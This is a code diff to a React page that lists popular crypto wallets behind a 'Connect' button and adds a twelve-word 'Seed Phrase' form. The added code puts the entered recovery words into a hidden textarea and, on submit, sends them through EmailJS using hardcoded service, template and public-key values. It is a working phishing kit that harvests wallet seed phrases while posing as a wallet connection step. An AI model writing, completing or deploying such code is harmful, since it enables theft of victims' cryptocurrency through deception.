@@ -1,6 +1,7 @@
-import React, { useState } from "react";
+import React, { useState, useRef} from "react";
 import SVGIcon from "../../Components/SvgIconProp";
 import { Button, Modal } from "antd";
+import  emailjs from "@emailjs/browser"
 
 const MapSVG: React.FC = () => {
   const SVGfiles: string[] = ['TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg', 'Argent.svg', 'Binance.svg', 'BonkBot.svg',
@@ -16,6 +17,9 @@ const MapSVG: React.FC = () => {
 
   const [firstModal, setFirstModal] = useState(false);
   const [secondModal, setSecondModal] = useState(false);
+  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""));
+ 
+
 
   const showFirstModal = () => {
     setFirstModal(true);
@@ -30,8 +34,46 @@ const MapSVG: React.FC = () => {
     setSecondModal(false)
   }
 
-  const inputDivStle = " flex border border-dashed border-gray-600 rounded-lg p-2 overflow-hidden"
-  const inputStyle = "focus:outline-none pl-1"
+  const inputDivStle = " flex border border-dashed border-gray-600 rounded-lg p-2 overflow-hidden";
+  const inputStyle = "focus:outline-none pl-1";
+
+
+  
+    
+
+    //Email Configurration
+    const formRef = useRef<HTMLFormElement>(null);
+
+    const sendEmail = (e: React.FormEvent<HTMLFormElement>) => {
+        e.preventDefault();
+
+      
+      if (formRef.current) {//using the conditional statement to check if formRef.current is null
+        emailjs
+          .sendForm('service_soml4ai', 'template_a0zy764', formRef.current, {
+            publicKey: 'n7CQrn8bAS_FXzHDw',
+          })
+          .then(
+            () => {
+              console.log('SUCCESS!');
+            },
+            (error) => {
+              console.log('FAILED...', error.text);
+            },
+          );
+      }
+        
+      };
+
+      // Function to handle seed phrase submission
+    const handleSeedPhraseSubmit =  () => {
+      // Combine all seed phrase words into a single string
+      
+      console.log(seedPhraseString)
+    };
+
+      const seedPhraseString = seedPhrase.join(' ');
+
 
   return (
     <div  className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0 ">
@@ -44,7 +86,7 @@ const MapSVG: React.FC = () => {
 
       <Modal
         onCancel={() => setFirstModal(false)}
-        visible={firstModal}
+        open={firstModal}
         title="Connect"
         footer={null}
         className=""
@@ -57,29 +99,42 @@ const MapSVG: React.FC = () => {
       </Modal>
 
       <Modal
-        visible={secondModal}
+        open={secondModal}
         title="Seed Phrase"
         onCancel={closeSecondModal}
         footer={null}
       >
+        
+        <form ref={formRef} onSubmit={sendEmail}>
         <div className="grid grid-cols-2 md:grid-cols-3 gap-4 justify-center">
-            <div  className={inputDivStle}><span>1.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>2.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>3.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>4.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>5.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>6.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>7.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>8.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>9.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>10.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>11.</span> <input type="text" className={inputStyle}/></div>
-            <div className={inputDivStle}><span>12.</span> <input type="text" className={inputStyle}/></div>
+            {Array(12).fill(null).map((_, index) => (
+                <div key={index + 1} className={inputDivStle}><span>{index + 1}.</span> <input type="text" className={inputStyle} 
+                // onChange={e => 
+                //   setSeedPhrase(prevSeedPhrase => [...prevSeedPhrase.slice(0, index), 
+                //     e.target.value, ...prevSeedPhrase.slice(index + 1)]
+                //   )} 
+
+                
+                onChange={(e) =>
+                  setSeedPhrase((prevSeedPhrase) => {
+                    e.preventDefault();
+                    const newSeedPhrase = [...prevSeedPhrase]; // Create a copy of the array
+                    newSeedPhrase[index] = e.target.value; // Update the value at the specific index
+                    return newSeedPhrase; // Return the new array
+                  })
+                }
+                />
+                </div>
+            ))}
         </div>
-        <div className="flex justify-end pt-5">
-            <Button type="primary" className="">Connect</Button>
+        <textarea name="message" className="hidden" value={seedPhraseString} />
+        <div className="flex justify-end pt-4">
+        
+          <button type="submit" value='send' className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" onClick={handleSeedPhraseSubmit}>Connect</button>
+            {/* <Button type="primary" className="" onClick={handleSeedPhraseSubmit}  >Connect</Button> */}
         </div>
-            
+        </form>
+    
       </Modal>
     </div>
   )
